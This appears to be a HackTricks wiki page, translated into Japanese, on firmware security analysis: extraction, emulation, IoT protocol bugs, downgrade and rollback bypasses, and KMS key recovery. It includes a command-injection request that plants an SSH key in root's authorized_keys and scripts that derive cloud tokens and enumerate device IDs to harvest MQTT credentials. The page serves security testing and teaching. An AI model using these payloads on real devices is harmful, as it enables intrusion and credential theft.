# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### 関連リソース

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmwareは、hardwareコンポーネントとユーザーが操作するsoftware間の通信を管理および促進することで、デバイスを正しく動作させるために不可欠なsoftwareです。Firmwareは永続メモリに保存されるため、デバイスの電源が入った瞬間から重要な命令にアクセスでき、operating systemの起動につながります。Firmwareを調査し、場合によっては変更することは、security vulnerabilitiesを特定するための重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集**は、デバイスの構成と使用されているtechnologyを理解するための重要な初期ステップです。このプロセスでは、以下のデータを収集します。

- CPU architectureと実行されるoperating system
- Bootloaderの詳細
- Hardware layoutとdatasheet
- Codebaseの指標とsourceの場所
- External libraryとlicenseの種類
- Update履歴と規制上のcertification
- Architectureおよびflow diagram
- Security assessmentと特定されたvulnerability

この目的において、**open-source intelligence (OSINT)** toolsは非常に有用です。また、利用可能なopen-source software componentsを手動および自動のreview processで分析することも重要です。[Coverity Scan](https://scan.coverity.com)や[Semmle’s LGTM](https://lgtm.com/#explore)などのtoolsでは、potential issueの発見に活用できる無料のstatic analysisを実行できます。

## **Firmwareの取得**

Firmwareはさまざまな方法で取得できますが、それぞれ複雑さのレベルが異なります。

- **直接**source（developer、manufacturer）から取得する
- 提供された手順に従って**build**する
- 公式support siteから**download**する
- ホストされているfirmware fileを探すために**Google dork** queryを使用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner)などのtoolsを使って**cloud storage**に直接アクセスする
- man-in-the-middle techniqueによって**update**をinterceptする
- **UART**、**JTAG**、**PICit**などのconnectionを通じてデバイスから**extract**する
- デバイス間通信内のupdate requestを**sniff**する
- **hardcoded update endpoint**を特定して使用する
- bootloaderまたはnetworkから**dump**する
- 他の方法がすべて失敗した場合、適切なhardware toolを使ってstorage chipを**removeしてread**する

### UART-only logs: flash内のU-Boot envによるroot shellの強制

UART RXが無視される場合（logsのみ）、**U-Boot environment blobをofflineで編集**することで、init shellを強制的に起動できます。<sup>[[6]](#references)</sup>

1. SOIC-8 clipとprogrammer（3.3V）を使ってSPI flashをdumpします。
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partitionを特定し、`bootargs`を編集して`init=/bin/sh`を含め、**U-Boot env CRC32をblobに対して再計算**します。
3. env partitionのみをreflashしてrebootします。UART上にshellが表示されるはずです。

これは、bootloader shellが無効化されている一方、external flash accessによってenv partitionを書き込み可能なembedded deviceで有用です。

## Firmwareの分析

**Firmwareを入手した**ので、どのように扱うべきかを把握するために、その情報をextractする必要があります。そのために使用できるさまざまなtoolsがあります。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
それらのツールであまり見つからない場合は、`binwalk -E <bin>` を使ってイメージの **entropy** を確認してください。entropy が低い場合、暗号化されている可能性は低いです。entropy が高い場合、暗号化されている可能性があります（または何らかの方法で圧縮されています）。

さらに、これらのツールを使用して **firmware 内に埋め込まれたファイル** を抽出できます：


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを調査できます。

### ファイルシステムの取得

先ほど説明した `binwalk -ev <bin>` などのツールを使用すれば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、ファイルシステムを **ファイルシステムの種類にちなんだ名前のフォルダー** 内に抽出します。通常、次のいずれかです：squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。この場合は、binwalk を使用して **ファイルシステムの offset を特定し、バイナリから圧縮されたファイルシステムを carve して**、以下の手順に従い、その種類に応じてファイルシステムを **手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して Squashfs ファイルシステムをカービングします。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" ディレクトリ内に展開されます。

- CPIO archive ファイル

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystem の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs filesystem の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware の分析

Firmware を取得したら、その構造と潜在的な脆弱性を理解するために、詳細に解析することが重要です。このプロセスでは、さまざまなツールを使用して firmware image を分析し、貴重なデータを抽出します。

### 初期分析ツール

binary file（`<bin>` と表記）の初期調査に使用する一連のコマンドを以下に示します。これらのコマンドは、file type の特定、strings の抽出、binary data の分析、partition と filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` を使用して **entropy** を確認します。低い entropy は暗号化されていない可能性を示し、高い entropy は暗号化または圧縮の可能性を示します。

**埋め込みファイル**を抽出するには、**file-data-carving-recovery-tools** documentation や、ファイル検査用の **binvis.io** などの tools and resources が推奨されます。

### ファイルシステムの抽出

`binwalk -ev <bin>` を使用すると、通常はファイルシステムを抽出でき、多くの場合、ファイルシステムの種類にちなんだ名前（例: squashfs、ubifs）の directory に保存されます。ただし、**binwalk** が magic bytes の欠落によりファイルシステムの種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` を使用してファイルシステムの offset を特定し、その後 `dd` command でファイルシステムを carve out します。
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、filesystem の種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### Filesystem Analysis

filesystem の抽出が完了すると、security flaw の検索を開始します。安全でない network daemon、hardcoded credential、API endpoint、update server の機能、未コンパイルの code、startup script、offline analysis 用の compiled binary に注意を払います。

**主な場所**と検査対象には、以下が含まれます。

- ユーザー credential を確認する **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificate と key
- 潜在的な vulnerability を確認するための configuration file と script file
- さらなる analysis 用の embedded binary
- 一般的な IoT device の web server と binary

filesystem 内の機密情報と vulnerability の発見には、複数の tool が役立ちます。

- 機密情報の検索用の [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware analysis 用の [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static analysis と dynamic analysis 用の [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binary の Security Check

filesystem 内で見つかった source code と compiled binary は、vulnerability がないか綿密に調査する必要があります。Unix binary 用の **checksec.sh** や Windows binary 用の **PESecurity** などの tool は、悪用される可能性のある保護されていない binary の特定に役立ちます。

## Derived URL Token を介した cloud config と MQTT credential の取得

多くの IoT hub は、次のような cloud endpoint から device ごとの configuration を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 中に、`<token>` が hardcoded secret を使用して device ID から locally derived されていることが判明する場合があります。例えば、以下のようになります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている者が URL を再構築し、cloud config を取得できます。その結果、plaintext の MQTT credential と topic prefix が明らかになることがよくあります。

実践的な workflow:

1) UART boot log から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、log を取得します。
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URLパターンとbroker addressを出力している行を探します。例：
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元する

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索する。
- algorithm（例: MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、digest を大文字にする:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials の収集

- URLを組み立て、curlでJSONを取得し、jqで解析してsecretを抽出する：
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文 MQTT と脆弱な topic ACL（存在する場合）の悪用

- 復元した credentials を使用して maintenance topic を subscribe し、sensitive event を探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能なデバイスIDを列挙する（大規模に、許可を得て）

- 多くのエコシステムでは、vendor OUI／製品／タイプのバイトに連番のサフィックスを続けた形式が使用されています。
- 候補IDを反復処理し、トークンを導出して、プログラムで設定を取得できます:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- mass enumerationを試みる前に、必ず明示的な承認を取得してください。
- 可能な場合は、target hardwareを変更せずにsecretを復元するため、emulationまたはstatic analysisを優先してください。


firmwareをemulationするプロセスにより、deviceの動作または個々のprogramの**dynamic analysis**が可能になります。このアプローチでは、hardwareやarchitectureへの依存関係が原因で課題に直面することがありますが、root filesystemまたは特定のbinaryを、Raspberry Piなどのarchitectureとendiannessが一致するdevice、あるいは事前構築済みのvirtual machineに転送することで、さらなるtestingが可能になります。

### 個々のBinaryのEmulation

単一のprogramを調査する場合、programのendiannessとCPU architectureを特定することが重要です。

#### MIPS Architectureの例

MIPS architectureのbinaryをemulationするには、次のcommandを使用できます：
```bash
file ./squashfs-root/bin/busybox
```
そして、必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS（big-endian）では`qemu-mips`を使用し、little-endianバイナリには`qemu-mipsel`を選択します。

#### ARM Architecture Emulation

ARMバイナリの場合もプロセスは同様で、エミュレーションには`qemu-arm`エミュレーターを使用します。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit)などのツールを使用すると、ファームウェア全体のエミュレーションが可能になり、プロセスを自動化して動的解析を支援できます。

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境を解析に使用します。OSとファイルシステムへのshellアクセスを維持することが重要です。エミュレーションではハードウェアとのやり取りを完全には再現できない場合があるため、エミュレーションを再起動する必要が生じることがあります。解析ではファイルシステムを再確認し、公開されているWebページやネットワークサービスをexploitし、bootloaderの脆弱性を調査する必要があります。潜在的なバックドアの脆弱性を特定するには、ファームウェアの整合性テストが重要です。

## Runtime Analysis Techniques

Runtime analysisでは、gdb-multiarch、Frida、Ghidraなどのツールを使用して、プロセスまたはバイナリが動作する環境内で操作します。ブレークポイントの設定や、fuzzingなどの手法による脆弱性の特定を行います。

完全なdebuggerを使用できないembedded targetでは、**静的リンクされた`gdbserver`をデバイスにコピーして、リモートでattachします**。<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub では、RF stack が **radio MCU** と Linux userland process の間で分割されていることがよくあります。実用的な workflow は、次の path を mapping することです:<sup>[[8]](#references)</sup>

1. **RF frame** on the air
2. **controller-side parser** in the radio MCU
3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
4. **application dispatcher** in the main daemon
5. **protocol-specific handler / state machine**

この architecture では、reversing target が 1 つではなく 2 つになります。controller が binary radio frame を `Group,Command,arg1,arg2,...` のような textual protocol に変換する場合は、次の項目を特定します。

- **message groups** と dispatch tables
- どの message が **network** から送信可能で、どれが controller 自体から送信されるか
- 正確な **manufacturer-specific discriminator fields** (例: Zigbee の `manufacturer_code` と custom `cluster_command`)
- **commissioning**、discovery、または firmware/model download phases 中にのみ到達可能な handler

Zigbee では、pairing traffic を capture し、target がまだ default **Link Key** `ZigBeeAlliance09` に依存しているか確認します。依存している場合、commissioning traffic の sniffing によって **Network Key** が露出する可能性があります。Zigbee 3.0 install codes はこの exposure を低減するため、tested device が実際にそれらを enforce しているかを記録します。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands は、standardized clusters よりも優れた target になることがよくあります。これは、十分に battle-tested されていない **custom parsing code** と internal **FSMs** に入力されるためです。<sup>[[8]](#references)</sup>

実用的な workflow:

- command dispatcher を reverse し、**vendor-only handler** を見つけます。
- **FSM state**、**event**、**check**、**action**、**next-state** tables を復元します。
- auto-advance する **transitional states** と、最終的に attacker-controlled state を reset または free する retry/error branches を特定します。
- buggy handler が常に reachable だと仮定せず、daemon を vulnerable state に移行させるために必要な正当な protocol exchanges を確認します。

Timing-sensitive protocols では、Python framework からの packet replay は遅すぎる場合があります。より reliable な approach は、vendor-grade stack を使用して real hardware (例: **nRF52840**) 上で legitimate device を emulate することです。これにより、正しい **endpoints**、**attributes**、および commissioning timing を提供できます。

### Fragmented-download bug class in embedded daemons

**fragmented blob/model/configuration downloads** では、繰り返し発生する firmware bug class が存在します:<sup>[[8]](#references)</sup>

1. **first fragment** (`offset == 0`) が `ctx->total_size` を保存し、`malloc(total_size)` を実行します。
2. 後続の fragments は、`packet_total_size >= offset + chunk_len` のような attacker-controlled **packet-local** fields のみを validate します。
3. copy は、元の allocated size に対する check なしで `memcpy(&ctx->buffer[offset], chunk, chunk_len)` を実行します。

これにより attacker は次を送信できます。

- **small** な declared total size を持つ first valid fragment を送り、小さな heap allocation を強制する。
- **expected offset** と、より大きな `chunk_len` を持つ後続 fragment を送る。
- fresh checks を満たしながら、元々 allocated された buffer を overflow させる forged packet-local size を送る。

vulnerable path が commissioning logic の背後にある場合、malformed fragments を送信する前に、target を想定された model-download または blob-download state に移行させるため、十分な **device emulation** を exploit に含める必要があります。

### Protocol-driven `free()` triggers

Embedded daemons では、heap metadata exploitation を trigger する最も簡単な方法は、多くの場合「cleanup を待つ」ことではなく、**protocol 自身の error handling を強制する**ことです:<sup>[[8]](#references)</sup>

- malformed follow-up fragments を送り、FSM を **retry** または **error** states に移行させます。
- retry threshold を超過させ、daemon に **reset context** と corrupted buffer の free を実行させます。
- この predictable な `free()` を使用して、process が無関係な理由で crash する前に allocator-side primitives を trigger します。

これは、embedded Linux の **musl/uClibc/dlmalloc-like** allocators に対して特に有用です。chunk metadata の corruption により、unlink/unbin logic を write primitive に変えられる可能性があるためです。安定した pattern は、real bin pointers を直ちに clobber して process を crash させるのではなく、**size field** を corruption して、overflow された buffer 内に配置した **fake chunks** へ allocator traversal を redirect することです。

## Binary Exploitation and Proof-of-Concept

特定された vulnerabilities の PoC を開発するには、target architecture と lower-level languages による programming を深く理解する必要があります。Embedded systems では binary runtime protections はまれですが、存在する場合は Return Oriented Programming (ROP) などの techniques が必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc は glibc に似た fastbins を使用します。後続の large allocation によって `__malloc_consolidate()` が trigger される可能性があるため、fake chunk は checks (sane size、`fd = 0`、および surrounding chunks が "in use" と認識されること) を通過できなければなりません。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** であれば、in-binary `.data/.bss` addresses は stable です。既に valid heap chunk header に似ている region を target にして、fastbin allocation を **function pointer table** 上に配置できます。
- **Parser-stopping NUL:** JSON が parsed される場合、payload 内の `\x00` によって parsing を停止させつつ、stack pivot/ROP chain 用の attacker-controlled bytes を後続に保持できます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()` を call する ROP chain により、known mapping 内に executable shellcode を配置して、そこへ jump できます。

## Firmware Analysis 用の Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating systems は、firmware security testing 用の pre-configured environments を提供し、必要な tools を備えています。

## Firmware を analyze するための Prepared OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) devices の security assessment と penetration testing を実行するための distro です。必要な tools がすべて loaded された pre-configured environment を提供することで、多くの時間を節約します。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools が preloaded された、Ubuntu 18.04 based の embedded security testing operating system です。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor が firmware images に対する cryptographic signature checks を実装している場合でも、**version rollback (downgrade) protection は頻繁に省略されます**。boot- または recovery-loader が embedded public key による signature のみを verify し、flash される image の *version* (または monotonic counter) を比較しない場合、attacker は **有効な signature が付いた古い vulnerable firmware** を正当に install できます。これにより、patch 済み vulnerabilities が再導入されます。<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Obtain an older signed image**
* vendor の public download portal、CDN、または support site から取得します。
* companion mobile/desktop applications から extract します (例: Android APK 内の `assets/firmware/`)。
* VirusTotal、Internet archives、forums などの third-party repositories から retrieve します。
2. exposed update channel 経由で **Upload or serve the image to the device**:
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くの consumer IoT devices は、Base64-encoded firmware blobs を受け付け、server-side で decode して recovery/upgrade を trigger する *unauthenticated* HTTP(S) endpoints を expose しています。
3. downgrade 後、新しい release で patch された vulnerability (例: 後から追加された command-injection filter) を exploit します。
4. persistence を獲得した後、検出を避けるため、必要に応じて latest image を flash し直すか、updates を disable します。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズなしでシェルコマンドに直接連結されるため、任意のコマンドをインジェクションできます（ここでは、SSH の鍵ベースによる root アクセスを有効化）。後のファームウェアバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護が存在しないため、この修正は実質的に無効です。<sup>[[4]](#references)</sup>

### Mobile Apps からのファームウェアの抽出

多くのベンダーは、アプリから Bluetooth/Wi-Fi 経由でデバイスを更新できるよう、完全なファームウェアイメージをコンパニオンモバイルアプリケーション内にバンドルしています。これらのパッケージは通常、APK/APEX 内の `assets/fw/` や `res/raw/` などのパスに暗号化されていない状態で保存されています。`apktool`、`ghidra`、あるいは単純な `unzip` などのツールを使えば、物理ハードウェアに触れることなく署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のvendorはanti-downgrade **ratchet**を実装していますが、それを*updater*ロジック内だけに限定しています（たとえばCAN経由のUDS routine、recovery command、userspace OTA agentなど）。後から**bootloader**がimage signature/CRCだけをチェックし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypass可能です。<sup>[[7]](#references)</sup>

典型的な脆弱な設計:

- Firmware metadataにversion descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- updaterはimage ratchetをpersistent storageに保存された値と比較し、より古いsigned imageを拒否する。
- bootloaderはそのratchetを**parse**せず、選択されたslotをbootする前にheader、CRC、signatureのみを検証する。
- Slot activationはpartition tableまたはper-slot generation counterに別々に保存され、検証済みの正確なfirmware digestに対して**cryptographically bound**されていない。

これにより、dual-slot systemで**validate-one-image / boot-another-image** primitiveが成立します。攻撃者が、current signed imageを使ってupdaterにslot Bを次のboot targetとして設定させ、その後reboot前にslot Bをoverwriteできる場合、bootloaderはすでにcommitされたslot metadataだけを信頼するため、downgraded imageをbootする可能性があります。

一般的なabuse pattern:

1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのslotが次のactive slotになるようlayoutに記録させる。
2. **まだrebootしない**。同じsessionでslot-preparation/erase routineに再入する。
3. stale stateに基づいてslotをeraseし、**current committed layout**を参照しないような、stale boot-stateまたはstale slot-selection logicを悪用する。
4. **older but still signed** firmwareをそのslotにwriteする。
5. ratchetを強制するvalidation routineをskipし、直接rebootする。
6. bootloaderはpromoteされたslotを選択し、signature/integrityだけを検証してold imageをbootする。

A/B update implementationをreverseする際に確認すべき点:

- 成功したswitch後にrefreshされない**boot-time flags**からslot selectionが導出されている。
- **current committed layout**ではなくstale stateに基づいてslotをeraseする`prepare_passive_slot()`形式のroutine。
- **generation counter** / active flagだけをincrementし、検証済みimage hashを保存しない`part_write_layout()`形式のfunction。
- ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには実装されていない。
- Eraseまたはrecovery routineが、slotのcontentをremoveしてrewriteした後も、そのslotをbootableとしてmarkしたままにする。

### Update Logicを評価するためのChecklist

* *update endpoint*のtransport/authenticationは適切に保護されているか（TLS + authentication）？
* Flashing前にdeviceは**version numbers**または**monotonic anti-rollback counter**を比較するか？
* Imageはsecure boot chain内でverificationされるか（例: ROM codeがsignatureをcheckする）？
* **bootloaderはupdaterと同じratchetをenforce**しているか、それともsignature/CRCだけをcheckしているか？
* Slot activation metadataは**validated firmware digest/versionにbound**されているか、それともpromotion後にslotをmodifyできるか？
* Slot switchが成功した後、deviceはrebootを強制されるか、それとも同じsessionで後続のupdate/erase routineに引き続きreachできるか？
* Userland codeは追加のsanity checkを実行するか（例: allowed partition map、model number）？
* *partial*または*backup* update flowは同じvalidation logicをreuseしているか？

> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対してvulnerableである可能性が高い。

## Practice用のVulnerable firmware

Firmwareのvulnerability発見をpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用します。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault stateからfirmware decryption keyをrecoverする

Update imageがsmall plaintext metadataとlarge high-entropy blobを混在させている場合、何かをbrute-forceする前にcontainer triageを行います:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使用してheaders、offsets、line boundariesをdumpする。
- `Salted__`は通常OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
- `256` bytesに正確にdecodeされるBase64 fieldは、random firmware password/session keyをwrapするRSA-2048 ciphertextを見ている強いhintです。
- 同じfile内のDetached PGP materialはauthenticityだけをprotectしていることが多く、それがconfidentiality mechanismだと想定しないでください。

Static key hunting（`grep`、`strings`、PEM/PGP searches）が失敗した場合は、private keyだけをsearchするのではなく、**operational decrypt path**をreverseします:

- Updater / management binaryをdecompileし、encrypted blobをreadするcomponent、どのhelper/APIがそれをunwrapするか、requestするlogical key nameをtraceする。
- Extractしたroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）とunit filesおよびinit scriptsをsearchする。
- Plaintextの`vault operator unseal ...`、recovery keys、bootstrap tokens、またはlocal KMS auto-unseal scriptsは、private-key materialと同等に扱う。

Applianceがoriginal Vault binaryとstorage backendをshipしている場合、Vault internalsをreimplementするよりも、そのenvironmentをreplayする方が通常は容易です:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
クローンした KMS 上で root を使用し、次の操作を行います。

- transit key を分離したクローン内でのみ export 可能にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗と、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは証明できません。多くの Vault-backed flow では OAEP with SHA-256 が使用されますが、一般的な library のデフォルトは SHA-1 です。
- payload が `Salted__` で始まる場合は、AES-CBC decryption を試す前に、vendor の OpenSSL KDF（`EVP_BytesToKey`、legacy appliance では MD5 がよく使われます）を正確に再現する。

これにより、「encrypted firmware」はより一般的な問題になります。**appliance 側の operational key を復元し、その後、正確な unwrap + KDF parameter を offline で再現する**という問題です。

## Training and Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で firmware を crack する: Senior-Level Skill、Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄された hardware の zero day を悪用する - Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの Smart Device で自宅への access を得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - charge port connector から Tesla Wall Connector を Exploiting - Part 2: anti-downgrade の bypass](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
